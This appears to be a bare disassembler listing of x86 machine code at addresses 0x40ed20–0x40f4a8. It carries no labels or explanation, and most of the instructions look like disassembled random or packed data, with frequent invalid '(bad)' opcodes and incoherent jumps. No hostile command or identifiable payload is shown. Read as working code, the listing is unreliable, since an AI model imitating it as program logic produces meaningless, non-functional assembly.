  40ed20:	cmp    cl,dl
  40ed22:	jae    0x40ed8d
  40ed24:	js     0x40ed57
  40ed26:	xlat   BYTE PTR ds:[ebx]
  40ed27:	mov    edi,0xbf654453
  40ed2c:	int3   
  40ed2d:	push   0x6b1efeaf
  40ed32:	jl     0x40eda5
  40ed34:	xor    ah,BYTE PTR [edx-0x39]
  40ed37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed38:	fcomp  QWORD PTR [ecx]
  40ed3a:	jo     0x40ecce
  40ed3c:	jl     0x40ed66
  40ed3e:	ficomp DWORD PTR [ebx]
  40ed40:	pop    esi
  40ed41:	adc    DWORD PTR [edx],ecx
  40ed43:	std    
  40ed44:	das    
  40ed45:	jnp    0x40ed7f
  40ed47:	mov    eax,0xab26b9e1
  40ed4c:	dec    edi
  40ed4d:	adc    BYTE PTR [ecx],dh
  40ed4f:	mov    ch,0x13
  40ed51:	sbb    bh,ah
  40ed53:	(bad)  
  40ed54:	sub    DWORD PTR [ebx],esi
  40ed56:	or     eax,0xc98fbbf4
  40ed5b:	pop    ecx
  40ed5c:	std    
  40ed5d:	(bad)  
  40ed5e:	xchg   si,ax
  40ed60:	mov    ds:0x66aa99ad,al
  40ed65:	pop    eax
  40ed66:	or     DWORD PTR [ecx],ebx
  40ed68:	jns    0x40ed5c
  40ed6a:	imul   ebp,DWORD PTR [ebp-0x3c],0x69
  40ed6e:	test   eax,0x1b8d5277
  40ed73:	xor    BYTE PTR [ebx+0x725044c8],dh
  40ed79:	xlat   BYTE PTR ds:[ebx]
  40ed7a:	mov    ds:0x99b91be1,al
  40ed7f:	sbb    DWORD PTR [ecx-0x38251333],ebp
  40ed85:	and    BYTE PTR [ebx+0x647841ad],dl
  40ed8b:	es gs call 0x9746:0x813599c5
  40ed94:	pop    es
  40ed95:	daa    
  40ed96:	mov    ebp,0x102e2885
  40ed9b:	data16 shr bh,cl
  40ed9e:	imul   esi,DWORD PTR [esi],0x5189329
  40eda4:	xchg   ebx,eax
  40eda5:	mov    edx,0xb65051b8
  40edaa:	jmp    0x40eda2
  40edac:	jo     0x40edaf
  40edae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edaf:	loope  0x40edef
  40edb1:	sbb    eax,0x4f7f19d2
  40edb6:	pop    ecx
  40edb7:	out    dx,eax
  40edb8:	dec    eax
  40edb9:	or     BYTE PTR [edx],ch
  40edbb:	adc    eax,0x9d193035
  40edc0:	bound  eax,QWORD PTR [ebx-0x1a]
  40edc3:	ret    
  40edc4:	es adc eax,0x6a430d3e
  40edca:	pop    ebx
  40edcb:	pushf  
  40edcc:	sbb    eax,0xe95d25ac
  40edd1:	cmp    DWORD PTR [esi-0x57],esp
  40edd4:	sbb    al,0x98
  40edd6:	pop    ebx
  40edd7:	xor    eax,DWORD PTR [ebp+0x78]
  40edda:	sbb    ch,bl
  40eddc:	fcomp  st(5)
  40edde:	xchg   bp,ax
  40ede0:	jmp    FWORD PTR [ecx+0x1c]
  40ede3:	pushf  
  40ede4:	lods   eax,DWORD PTR ds:[esi]
  40ede5:	pop    ds
  40ede6:	jns    0x40ee61
  40ede8:	and    ebx,ebp
  40edea:	dec    ebx
  40edeb:	jo     0x40ee50
  40eded:	cmp    ch,BYTE PTR [ecx+ebx*1]
  40edf0:	xor    eax,0xf98ebbe8
  40edf5:	ret    0x1565
  40edf8:	xchg   DWORD PTR ds:0xe6ea9993,edx
  40edfe:	shr    BYTE PTR [ebp+edi*2+0x1184ddd],cl
  40ee05:	adc    DWORD PTR [eax-0x50],0x32
  40ee09:	shl    DWORD PTR [ecx],0xdc
  40ee0c:	pusha  
  40ee0d:	mov    esp,0x9053cb0e
  40ee12:	ret    
  40ee13:	pop    ds
  40ee14:	pop    es
  40ee15:	pop    ds
  40ee16:	loope  0x40edb4
  40ee18:	mov    ebp,DWORD PTR [eax+ecx*1]
  40ee1b:	jle    0x40ee22
  40ee1d:	sub    al,0x66
  40ee1f:	jmp    0x4a7daa41
  40ee24:	js     0x40ee13
  40ee26:	je     0x40ee1e
  40ee28:	scas   eax,DWORD PTR es:[edi]
  40ee29:	or     al,0x66
  40ee2b:	int    0xee
  40ee2d:	test   edi,ebp
  40ee2f:	inc    eax
  40ee30:	add    ebx,DWORD PTR [edx]
  40ee32:	stos   BYTE PTR es:[edi],al
  40ee33:	out    dx,eax
  40ee34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee35:	fadd   DWORD PTR [esi+0x22fe4ad]
  40ee3b:	mov    eax,0xe182af53
  40ee40:	popf   
  40ee41:	leave  
  40ee42:	pop    esp
  40ee43:	dec    ebp
  40ee44:	mov    dl,0x3c
  40ee46:	pop    esi
  40ee47:	or     al,0x53
  40ee49:	mov    esi,0xd8c7ca28
  40ee4e:	(bad)  
  40ee4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee50:	push   ebx
  40ee51:	(bad)  
  40ee52:	stc    
  40ee53:	pop    esi
  40ee54:	fld    TBYTE PTR [ebx+0x6ae0f3c1]
  40ee5a:	jb     0x40ee09
  40ee5c:	dec    edx
  40ee5d:	dec    ecx
  40ee5e:	daa    
  40ee5f:	inc    esi
  40ee60:	xchg   BYTE PTR [ecx+0x70],cl
  40ee63:	les    esi,FWORD PTR [ebp-0x3cc39598]
  40ee69:	ror    BYTE PTR [eax],cl
  40ee6b:	jp     0x40ee10
  40ee6d:	imul   esi,DWORD PTR [edx-0x4d],0xfb4a5274
  40ee74:	popa   
  40ee75:	test   BYTE PTR [ebx],0x5c
  40ee78:	cmp    DWORD PTR [ebp-0x1692b702],esp
  40ee7e:	mov    edi,0x258a65c6
  40ee83:	rcl    BYTE PTR [edi+0x3812de99],1
  40ee89:	sbb    bl,BYTE PTR [ebx]
  40ee8b:	lds    ebx,FWORD PTR [edi+eax*8+0x24198966]
  40ee92:	inc    ebp
  40ee93:	sub    DWORD PTR [ebx+edx*2+0x1c08a8e5],esi
  40ee9a:	(bad)  
  40ee9b:	sub    eax,0xf442acd3
  40eea0:	sub    cl,BYTE PTR ds:0x7853586e
  40eea6:	int    0x15
  40eea8:	inc    ebp
  40eea9:	xor    ecx,DWORD PTR ds:0xee698697
  40eeaf:	outs   dx,BYTE PTR ds:[esi]
  40eeb0:	fmul   QWORD PTR [eax+0x64]
  40eeb3:	sub    al,ah
  40eeb5:	adc    ah,BYTE PTR [esi-0x7c]
  40eeb8:	enter  0x4547,0x10
  40eebc:	mov    eax,ds:0xd4d0f0de
  40eec1:	pop    DWORD PTR [ebx+ebx*4-0x48e6c4e8]
  40eec8:	inc    esi
  40eec9:	in     eax,dx
  40eeca:	imul   edx,DWORD PTR fs:[edx+0x7946a99d],0xffffff89
  40eed2:	push   edi
  40eed3:	push   ebp
  40eed4:	dec    si
  40eed6:	push   0x762b297c
  40eedb:	jae    0x40ee85
  40eedd:	aaa    
  40eede:	cdq    
  40eedf:	js     0x40ef39
  40eee1:	dec    ebx
  40eee2:	mov    BYTE PTR ds:0xa74e952,bl
  40eee8:	add    eax,0x16aca8d4
  40eeed:	jg     0x40eede
  40eeef:	rcl    ebx,0x9d
  40eef2:	cld    
  40eef3:	push   0x7165dbc8
  40eef8:	ds jecxz 0x40ef31
  40eefb:	jmp    0x9496e998
  40ef00:	inc    ebx
  40ef01:	mov    esi,0xc932d40b
  40ef06:	xchg   esi,eax
  40ef07:	pop    esp
  40ef08:	mov    cl,0x9d
  40ef0a:	sahf   
  40ef0b:	retf   0x205e
  40ef0e:	cmp    esi,ebp
  40ef10:	out    dx,eax
  40ef11:	jmp    0xb446:0x47312a02
  40ef18:	mov    esi,0x53a7e82e
  40ef1d:	cli    
  40ef1e:	push   ss
  40ef1f:	pop    es
  40ef20:	jg     0x40eefc
  40ef22:	out    dx,eax
  40ef23:	fs push ebx
  40ef25:	daa    
  40ef26:	jp     0x40ef2e
  40ef28:	xchg   esi,eax
  40ef29:	pop    ecx
  40ef2a:	and    eax,0x986ad224
  40ef2f:	adc    al,0x4f
  40ef31:	mov    WORD PTR [edx-0x2b],?
  40ef34:	in     al,dx
  40ef35:	mov    ebx,0xa0b72a79
  40ef3a:	xchg   esp,eax
  40ef3b:	push   ds
  40ef3c:	dec    esp
  40ef3d:	jnp    0x40ef3e
  40ef3f:	sbb    eax,0xcb9a6a9f
  40ef44:	sub    al,0xb7
  40ef46:	pop    esi
  40ef47:	mov    ?,ebx
  40ef49:	adc    ebp,edx
  40ef4b:	leave  
  40ef4c:	sti    
  40ef4d:	pop    esp
  40ef4e:	data16 scas al,BYTE PTR es:[edi]
  40ef50:	and    BYTE PTR [eax+edx*4+0x2f],bh
  40ef54:	mov    eax,ds:0xe41b7147
  40ef59:	sub    dl,BYTE PTR [eax+0x14]
  40ef5c:	xchg   esi,eax
  40ef5d:	pop    esp
  40ef5e:	cmp    DWORD PTR [eax+0x52],eax
  40ef61:	ret    0xb462
  40ef64:	mov    ecx,0x3b016905
  40ef69:	std    
  40ef6a:	loopne 0x40ef3c
  40ef6c:	sti    
  40ef6d:	and    ecx,DWORD PTR [edi-0x41]
  40ef70:	out    dx,eax
  40ef71:	retf   0xe135
  40ef74:	xchg   ebx,eax
  40ef75:	enter  0xd7ee,0xa7
  40ef79:	jne    0x40efc7
  40ef7b:	sbb    ch,al
  40ef7d:	lds    esp,FWORD PTR [ebx-0x5bde7ebd]
  40ef83:	cmc    
  40ef84:	jmp    0x5daa:0xd41b6720
  40ef8b:	jno    0x40ef6e
  40ef8d:	scas   eax,DWORD PTR es:[edi]
  40ef8e:	dec    eax
  40ef8f:	ins    BYTE PTR es:[edi],dx
  40ef90:	add    BYTE PTR [ebx+0x47],0x1d
  40ef94:	push   ebx
  40ef95:	push   esp
  40ef96:	fs pusha 
  40ef98:	sub    ecx,DWORD PTR [edx]
  40ef9a:	imul   ebx,DWORD PTR [eax],0x49
  40ef9d:	pushf  
  40ef9e:	(bad)  
  40ef9f:	push   ebp
  40efa0:	sahf   
  40efa1:	lods   al,BYTE PTR ds:[esi]
  40efa2:	and    BYTE PTR [ecx+0x53],ah
  40efa5:	mov    dh,0x72
  40efa7:	popa   
  40efa8:	enter  0x9819,0x4c
  40efac:	hlt    
  40efad:	add    DWORD PTR [ecx+0x305a8aee],ebp
  40efb3:	imul   esi,eax,0x5384968e
  40efb9:	mov    edx,ecx
  40efbb:	lods   eax,DWORD PTR ds:[esi]
  40efbc:	push   ecx
  40efbd:	mov    fs,WORD PTR [eax-0x33]
  40efc0:	sbb    BYTE PTR [ecx+ebp*8],0xd3
  40efc4:	jg     0x40ef9c
  40efc6:	data16 cmp cl,BYTE PTR [ecx-0x5c]
  40efca:	stos   BYTE PTR es:[edi],al
  40efcb:	test   BYTE PTR [ebx+0xb],dl
  40efce:	loop   0x40efda
  40efd0:	xor    bl,al
  40efd2:	fsubr  DWORD PTR [ebp+0x1a114f0c]
  40efd8:	xchg   DWORD PTR [edi+edi*4+0x40],ebx
  40efdc:	shl    DWORD PTR [ebx],cl
  40efde:	sbb    DWORD PTR [ebx-0x47],edx
  40efe1:	fbld   TBYTE PTR [esi-0x68]
  40efe4:	repz mov ds:0xf6cae7b9,eax
  40efea:	lods   al,BYTE PTR ds:[esi]
  40efeb:	sbb    DWORD PTR [esi+0x5ec404c4],edi
  40eff1:	rol    BYTE PTR [edi+ebx*4-0x656376b0],0x43
  40eff9:	scas   eax,DWORD PTR es:[edi]
  40effa:	and    edi,DWORD PTR [bx+di-0x30]
  40effe:	sbb    eax,0x7943e61b
  40f003:	in     eax,0x2f
  40f005:	scas   al,BYTE PTR es:[edi]
  40f006:	int    0x60
  40f008:	push   ebx
  40f009:	pop    ecx
  40f00a:	add    ebx,esp
  40f00c:	fst    DWORD PTR [ebx+0x6eff68c]
  40f012:	sub    al,0xec
  40f014:	pop    es
  40f015:	cmp    BYTE PTR [ebx-0x1a9ddab0],0x26
  40f01c:	nop
  40f01d:	arpl   di,bp
  40f01f:	adc    eax,0xab662781
  40f024:	or     dl,bl
  40f026:	adc    al,al
  40f028:	sbb    bh,BYTE PTR [edx]
  40f02a:	test   al,0x19
  40f02c:	and    dh,BYTE PTR [ecx-0x10d5ebd9]
  40f032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f033:	arpl   WORD PTR [edx-0x23],dx
  40f036:	js     0x40f007
  40f038:	xchg   esi,eax
  40f039:	aam    0xf
  40f03b:	imul   esi,DWORD PTR [edi],0x3d
  40f03e:	mov    cl,0x19
  40f040:	and    edi,DWORD PTR [edx]
  40f042:	jne    0x40f03a
  40f044:	sub    eax,0x678047f7
  40f049:	cmp    dl,BYTE PTR [ecx+0x7]
  40f04c:	adc    esp,DWORD PTR [edi]
  40f04e:	es enter 0x537c,0xba
  40f053:	ror    BYTE PTR [ebp+0x3fa90d6e],1
  40f059:	rcr    DWORD PTR [eax+0x19484719],0x13
  40f060:	push   ebx
  40f061:	rcl    BYTE PTR [esi],0x2f
  40f064:	mulps  xmm1,XMMWORD PTR [ecx]
  40f067:	imul   eax,esp,0x7
  40f06a:	mov    ah,0x4a
  40f06c:	adc    cl,cl
  40f06e:	jns    0x40f049
  40f070:	and    BYTE PTR [esi+0x494f8d4e],cl
  40f076:	stos   DWORD PTR es:[edi],eax
  40f077:	popf   
  40f078:	push   ebx
  40f079:	pop    ds
  40f07a:	pop    ds
  40f07b:	(bad)
  40f07e:	pop    ds
  40f07f:	lods   al,BYTE PTR ds:[esi]
  40f080:	out    dx,eax
  40f081:	push   0xffffff98
  40f083:	jl     0x40f0ce
  40f085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f086:	loop   0x40f0b7
  40f088:	pop    edi
  40f089:	mov    ebx,0xfb69048
  40f08e:	nop
  40f08f:	stc    
  40f090:	stc    
  40f091:	int3   
  40f092:	push   edi
  40f093:	add    BYTE PTR [eax+0x52ccf604],ch
  40f099:	lods   eax,DWORD PTR ds:[esi]
  40f09a:	pop    es
  40f09b:	xchg   ebx,eax
  40f09c:	cli    
  40f09d:	jbe    0x40f0f0
  40f09f:	or     eax,0xed8b39aa
  40f0a4:	push   ebx
  40f0a5:	cmp    dl,0x8a
  40f0a8:	mov    bl,0x61
  40f0aa:	(bad)  
  40f0ac:	mov    ds:0x16f96369,eax
  40f0b1:	fdivr  st,st(0)
  40f0b3:	ret    
  40f0b4:	push   ds
  40f0b5:	pop    ds
  40f0b6:	or     esi,DWORD PTR [edi]
  40f0b8:	pop    ecx
  40f0b9:	jmp    0xe11b:0x78704366
  40f0c0:	sub    al,0x72
  40f0c2:	mov    bh,ch
  40f0c4:	ret    
  40f0c5:	push   0xffffffd2
  40f0c7:	mov    ah,BYTE PTR [esi]
  40f0c9:	sub    BYTE PTR [esi-0x5553b39f],dl
  40f0cf:	scas   eax,DWORD PTR es:[edi]
  40f0d0:	jmp    0xfef6a7a4
  40f0d5:	fidivr DWORD PTR [esi+0x63]
  40f0d8:	test   BYTE PTR [edi],dh
  40f0da:	out    0x42,ax
  40f0dd:	in     al,0x8
  40f0df:	xor    cl,dh
  40f0e1:	in     eax,dx
  40f0e2:	out    dx,al
  40f0e3:	sbb    al,0x53
  40f0e5:	test   al,0xe5
  40f0e7:	arpl   WORD PTR [ebx-0x692bc2ee],bp
  40f0ed:	imul   ebp,DWORD PTR ds:0xd957e473,0x660ba520
  40f0f7:	(bad)  
  40f0f8:	cmc    
  40f0f9:	sbb    al,0x48
  40f0fb:	mov    eax,ds:0x6f664f03
  40f100:	je     0x40f10f
  40f102:	or     cl,dh
  40f104:	mov    ecx,DWORD PTR [edi-0xbc7a9f9]
  40f10a:	mov    dl,0x1c
  40f10c:	dec    ebx
  40f10d:	es mov edx,0x862f53c9
  40f113:	sub    al,0xc6
  40f115:	ja     0x40f0fd
  40f117:	mov    ds:0x92df0623,eax
  40f11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f11d:	jge    0x40f0c5
  40f11f:	mov    WORD PTR [ebx],?
  40f121:	mov    ch,0xc4
  40f123:	mov    edx,DWORD PTR [ebx-0x59]
  40f126:	jmp    0x7c2ec578
  40f12b:	mov    eax,DWORD PTR [eax+0x706d9369]
  40f131:	inc    eax
  40f132:	(bad)  
  40f133:	stc    
  40f134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f135:	fsub   DWORD PTR [esi+0x40]
  40f138:	adc    BYTE PTR [edi+0x65],bl
  40f13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f13c:	js     0x977b0a6a
  40f142:	mov    dh,0xa9
  40f144:	(bad)  
  40f146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f147:	add    cl,bl
  40f149:	mov    cs,WORD PTR [edx]
  40f14b:	repnz add BYTE PTR [ecx-0x1a],dl
  40f14f:	jo     0x40f126
  40f151:	popf   
  40f152:	push   esp
  40f153:	jne    0x40f18f
  40f155:	imul   ebp,ecx,0x31
  40f158:	shl    ecx,cl
  40f15a:	jmp    0x1214:0xcbb36e18
  40f161:	or     BYTE PTR [eax-0x42f4de58],dh
  40f167:	xchg   ebp,eax
  40f168:	push   esp
  40f169:	bound  ebp,QWORD PTR [eax-0x6c]
  40f16c:	retf   0xa66a
  40f16f:	dec    ebp
  40f170:	sbb    ecx,DWORD PTR [edx]
  40f172:	sub    eax,0xacdf26d0
  40f177:	sub    al,al
  40f179:	fimul  DWORD PTR [ebx+edx*4+0x6f]
  40f17d:	fisub  WORD PTR [esi-0x6d]
  40f180:	sbb    al,0x35
  40f182:	int    0xc6
  40f184:	pop    edx
  40f185:	(bad)  
  40f186:	and    bl,BYTE PTR [ecx]
  40f188:	ret    0x96eb
  40f18b:	cs cmp eax,0xbf884f1f
  40f191:	lds    esp,FWORD PTR [ebp-0x69]
  40f194:	adc    bh,BYTE PTR [ebx+0x597900ae]
  40f19a:	(bad)  
  40f19c:	aad    0x6b
  40f19e:	fisubr WORD PTR [ecx+0x15]
  40f1a1:	es es xchg edi,eax
  40f1a4:	stc    
  40f1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1a6:	cdq    
  40f1a7:	loopne 0x40f1cb
  40f1a9:	in     al,0xef
  40f1ab:	jne    0x40f138
  40f1ad:	iret   
  40f1ae:	dec    esi
  40f1af:	fldcw  WORD PTR [eax]
  40f1b1:	jg     0x40f22e
  40f1b3:	adc    al,0xd
  40f1b5:	shr    BYTE PTR [esi-0x44],cl
  40f1b8:	push   esi
  40f1b9:	imul   eax,DWORD PTR [edi+0x71022a3],0x2ee8c0ee
  40f1c3:	jne    0x40f19d
  40f1c5:	jmp    0xe6a:0x46fe9119
  40f1cc:	and    BYTE PTR [ebx+0xf],ch
  40f1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1d0:	std    
  40f1d1:	sbb    al,0x3c
  40f1d3:	push   ss
  40f1d4:	xor    edx,DWORD PTR [edi]
  40f1d6:	data16 adc dh,bl
  40f1d9:	not    BYTE PTR [ebp-0x3cfa3574]
  40f1df:	shl    BYTE PTR [ebp-0xe3ae154],1
  40f1e5:	cmp    al,BYTE PTR [esi+ebx*8-0x67]
  40f1e9:	mov    bl,0x7c
  40f1eb:	inc    eax
  40f1ec:	pop    edi
  40f1ed:	mov    bh,0x1a
  40f1ef:	lock (bad) 
  40f1f3:	adc    DWORD PTR [ecx+0x6a],eax
  40f1f6:	mov    ebx,0xebd8a6ac
  40f1fb:	sub    eax,0xe8ca53ee
  40f200:	dec    edi
  40f201:	imul   eax,DWORD PTR [ecx+0x4613fb62],0x276ae14c
  40f20b:	int3   
  40f20c:	or     al,0x5
  40f20e:	jp     0x40f20e
  40f210:	pusha  
  40f211:	in     eax,dx
  40f212:	data16 (bad) 
  40f214:	into   
  40f215:	mov    ebx,0x63167888
  40f21a:	dec    ebp
  40f21b:	scas   al,BYTE PTR es:[edi]
  40f21c:	push   0x4a473ecb
  40f221:	sbb    DWORD PTR [ebx+0x27],esp
  40f224:	xor    BYTE PTR [edx-0x7b04ed3d],ch
  40f22a:	mov    ebx,0x2b7fc4eb
  40f22f:	out    dx,eax
  40f230:	push   0xab96048
  40f235:	retf   0x39b0
  40f238:	into   
  40f239:	(bad)  
  40f23a:	clc    
  40f23b:	out    0x13,al
  40f23d:	out    0x8c,al
  40f23f:	ret    
  40f240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f241:	imul   esp,DWORD PTR [ebp+0x3cef1db9],0x79a52dbc
  40f24b:	inc    edx
  40f24c:	scas   eax,DWORD PTR es:[edi]
  40f24d:	jle    0x40f29b
  40f24f:	mov    eax,eax
  40f251:	cs (bad) 
  40f254:	pop    esp
  40f255:	jl     0x40f1ed
  40f257:	mul    BYTE PTR [ebx]
  40f259:	cmp    BYTE PTR [esi],bl
  40f25b:	sti    
  40f25c:	sbb    DWORD PTR [esi],ecx
  40f25e:	pop    cx
  40f260:	adc    al,0x1
  40f262:	in     al,0xd6
  40f264:	pop    ds
  40f265:	ret    
  40f266:	fnstsw WORD PTR [edx+0x1b0b1a41]
  40f26c:	loopne 0x40f297
  40f26e:	adc    edi,esi
  40f270:	dec    esp
  40f271:	ret    0x212e
  40f274:	pop    ebp
  40f275:	imul   esi,DWORD PTR [edi+0x7cdaf7ab],0x23ed37f1
  40f27f:	mov    ds:0xd94f8e48,eax
  40f284:	push   esi
  40f285:	loope  0x40f250
  40f287:	dec    edx
  40f288:	lock mov esi,0x925c72ae
  40f28e:	push   0x80ea5341
  40f293:	outs   dx,DWORD PTR ds:[esi]
  40f294:	or     al,0x34
  40f296:	adc    eax,0xe69576df
  40f29b:	repz rcl DWORD PTR cs:[ebx+0x669478eb],1
  40f2a3:	call   FWORD PTR [eax+0x30]
  40f2a6:	out    dx,al
  40f2a7:	or     BYTE PTR ds:0x8e1b6789,bl
  40f2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2ae:	ds cs or al,0x55
  40f2b2:	popf   
  40f2b3:	dec    ebp
  40f2b4:	push   ebx
  40f2b5:	dec    ebp
  40f2b6:	dec    ecx
  40f2b7:	(bad)  
  40f2b8:	imul   ebp,DWORD PTR [edi+0x6a5689ec],0x1b357217
  40f2c2:	pop    esp
  40f2c3:	iret   
  40f2c4:	sub    DWORD PTR [ebx+0x15538e1e],edi
  40f2ca:	mov    ds:0x9a166c68,al
  40f2cf:	bound  edx,QWORD PTR [esp+esi*2-0x4c]
  40f2d3:	js     0x40f349
  40f2d5:	imul   ebp,DWORD PTR [eax],0xcabd466b
  40f2db:	in     al,dx
  40f2dc:	cmp    eax,0x864a641f
  40f2e1:	sbb    al,0x33
  40f2e3:	lods   eax,DWORD PTR ds:[esi]
  40f2e4:	ja     0x40f327
  40f2e6:	shr    DWORD PTR [ebx-0x6876966d],1
  40f2ec:	mov    dh,0x4
  40f2ee:	int3   
  40f2ef:	xchg   DWORD PTR [esi-0x79],edx
  40f2f2:	data16 sub al,0xb5
  40f2f5:	out    dx,eax
  40f2f6:	(bad)  [ebp+0x6c]
  40f2f9:	pop    esi
  40f2fa:	pop    ecx
  40f2fb:	rol    BYTE PTR [eax+0x1],0xd
  40f2ff:	mov    edi,0xba33e9a1
  40f304:	loope  0x40f2f3
  40f306:	ret    
  40f307:	or     DWORD PTR [ebx-0x31],edx
  40f30a:	sub    ecx,ecx
  40f30c:	ja     0x40f2e5
  40f30e:	xor    BYTE PTR [ebx+0x64],cl
  40f311:	outs   dx,BYTE PTR ds:[esi]
  40f312:	dec    esi
  40f313:	pop    ebx
  40f314:	and    BYTE PTR [edi-0xf],bh
  40f317:	dec    esp
  40f318:	imul   DWORD PTR [edx+0x4e]
  40f31b:	mov    eax,DWORD PTR [eax+0x1b]
  40f31e:	std    
  40f31f:	pop    esp
  40f320:	push   ebx
  40f321:	into   
  40f322:	mov    ebp,0xa061d13f
  40f327:	inc    esi
  40f328:	mov    al,0xd1
  40f32a:	xchg   esi,eax
  40f32b:	(bad)  
  40f32d:	call   0xcdbb5e08
  40f332:	xchg   DWORD PTR [edi],ebx
  40f334:	push   ebx
  40f335:	ret    
  40f336:	add    edx,DWORD PTR [ebp-0x59857aa1]
  40f33c:	mov    esi,0xd4a9846a
  40f341:	pop    esp
  40f342:	arpl   WORD PTR [edx],ax
  40f344:	loop   0x40f2fa
  40f346:	sbb    edi,DWORD PTR [ebp-0x2]
  40f349:	adc    esp,esi
  40f34b:	cmp    BYTE PTR [ebp-0x2f25705b],cl
  40f351:	push   0xffffffa6
  40f353:	push   ecx
  40f354:	popf   
  40f355:	sahf   
  40f356:	jle    0x40f321
  40f358:	cmp    BYTE PTR [edx-0x62812587],0xd5
  40f35f:	push   esi
  40f360:	dec    esi
  40f361:	(bad)  [edx+0xd1fd4bd]
  40f367:	pop    ebx
  40f368:	mov    gs,WORD PTR [ebp-0x4b]
  40f36b:	lds    ecx,FWORD PTR [ecx-0xa6f86b5]
  40f371:	rcr    BYTE PTR [ebx],0x5c
  40f374:	adc    DWORD PTR ds:0x2ece19a5,esi
  40f37a:	mov    edx,0x9558aa71
  40f37f:	aad    0x52
  40f381:	lods   eax,DWORD PTR ds:[esi]
  40f382:	mov    ds:0x811098cb,eax
  40f387:	mov    cl,0x42
  40f389:	sub    DWORD PTR [edx-0x6194e013],edi
  40f38f:	idiv   BYTE PTR [eax+0x4ed66f38]
  40f395:	add    edx,ebp
  40f397:	cmc    
  40f398:	push   ebx
  40f399:	ds out 0x6f,al
  40f39c:	push   0xffffff88
  40f39e:	mov    dl,0xfb
  40f3a0:	sub    DWORD PTR [ecx-0x1],0xf
  40f3a4:	push   esp
  40f3a5:	loopne 0x40f343
  40f3a7:	xchg   esi,eax
  40f3a8:	push   ecx
  40f3a9:	pcmpgtd mm0,QWORD PTR [ebx]
  40f3ac:	add    al,0xb
  40f3ae:	mov    al,ds:0x1b9e2380
  40f3b3:	sbb    ecx,DWORD PTR ds:0x99f456c8
  40f3b9:	cli    
  40f3ba:	retf   
  40f3bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3bc:	xor    edi,ecx
  40f3be:	inc    cx
  40f3c0:	add    DWORD PTR [edx-0xb],eax
  40f3c3:	clc    
  40f3c4:	xor    bl,BYTE PTR [ebp-0x35f2e797]
  40f3ca:	pop    ss
  40f3cb:	ins    DWORD PTR es:[edi],dx
  40f3cc:	es in  al,dx
  40f3ce:	je     0x40f42b
  40f3d0:	adc    DWORD PTR [edi],edx
  40f3d2:	clc    
  40f3d3:	xchg   edx,eax
  40f3d4:	push   ebx
  40f3d5:	inc    esi
  40f3d6:	arpl   WORD PTR [ebx],cx
  40f3d8:	sub    eax,0x21b539ae
  40f3dd:	imul   edi,ebp,0x4e
  40f3e0:	jnp    0x40f372
  40f3e2:	push   0x6a
  40f3e4:	fsubr  st,st(3)
  40f3e6:	adc    bx,di
  40f3e9:	ins    BYTE PTR es:[edi],dx
  40f3ea:	xor    esp,DWORD PTR [eax]
  40f3ec:	cmp    DWORD PTR [eax+0x1a],ecx
  40f3ef:	sbb    edi,DWORD PTR [ecx-0x44]
  40f3f2:	push   ebx
  40f3f3:	mov    ecx,0x9b24aa74
  40f3f8:	push   ebx
  40f3f9:	xor    BYTE PTR [ebx+0x59],ch
  40f3fc:	or     ch,BYTE PTR [edx-0x65]
  40f3ff:	mov    eax,ds:0x207b6b1c
  40f404:	out    0x3e,eax
  40f406:	adc    ebp,ebx
  40f408:	sub    al,0x9b
  40f40a:	data16 xor cl,0xc4
  40f40e:	or     dl,BYTE PTR [ecx+ebx*4-0x685407cf]
  40f415:	push   ecx
  40f416:	add    al,0x71
  40f418:	icebp  
  40f419:	mov    dl,0x50
  40f41b:	push   esp
  40f41c:	xor    esi,DWORD PTR [ecx+0x2e]
  40f41f:	nop
  40f420:	push   ebx
  40f421:	mov    al,0xb5
  40f423:	fldcw  WORD PTR [ecx+0x4edd54d8]
  40f429:	sub    BYTE PTR [edi-0x7559ac14],ah
  40f42f:	add    BYTE PTR [eax],bh
  40f431:	addr16 and eax,0x2fb065ab
  40f437:	sbb    BYTE PTR [ebx-0x2c7c3bce],dl
  40f43d:	sbb    al,0xf7
  40f43f:	shr    BYTE PTR [ecx],1
  40f441:	mov    bh,0x4
  40f443:	mov    bl,bh
  40f445:	push   ss
  40f446:	mov    eax,ds:0x63379b59
  40f44b:	jnp    0x40f430
  40f44d:	and    DWORD PTR [esi-0x4d],0x9461da16
  40f454:	retf   
  40f455:	sub    DWORD PTR [edi],edi
  40f457:	sbb    DWORD PTR [esi],ecx
  40f459:	leave  
  40f45a:	xchg   edx,eax
  40f45b:	dec    ebp
  40f45c:	pop    ebx
  40f45d:	repz retf 0x534e
  40f461:	jp     0x40f46d
  40f463:	hlt    
  40f464:	xor    al,0x1c
  40f466:	ins    DWORD PTR es:[edi],dx
  40f467:	push   ebp
  40f468:	mov    ebp,0xe11b1e6c
  40f46d:	jg     0x40f484
  40f46f:	ins    DWORD PTR es:[edi],dx
  40f470:	mov    edx,0x103a9bca
  40f475:	dec    edi
  40f476:	xchg   ebx,eax
  40f477:	dec    esi
  40f478:	adc    BYTE PTR [esi-0x1dcf649],cl
  40f47e:	sub    eax,0x7b757219
  40f483:	mov    ds:0xacc38e22,eax
  40f488:	push   ebx
  40f489:	scas   eax,DWORD PTR es:[edi]
  40f48a:	cld    
  40f48b:	inc    eax
  40f48c:	stos   DWORD PTR es:[edi],eax
  40f48d:	dec    eax
  40f48e:	mov    BYTE PTR [esi+edi*8-0x39ace296],al
  40f495:	push   ss
  40f496:	cmp    edx,esp
  40f498:	push   0x531d466c
  40f49d:	imul   BYTE PTR [ebp+ebx*2-0x3887c3c]
  40f4a4:	(bad)  
  40f4a5:	cs out 0xb2,eax
  40f4a8:	push   ebx
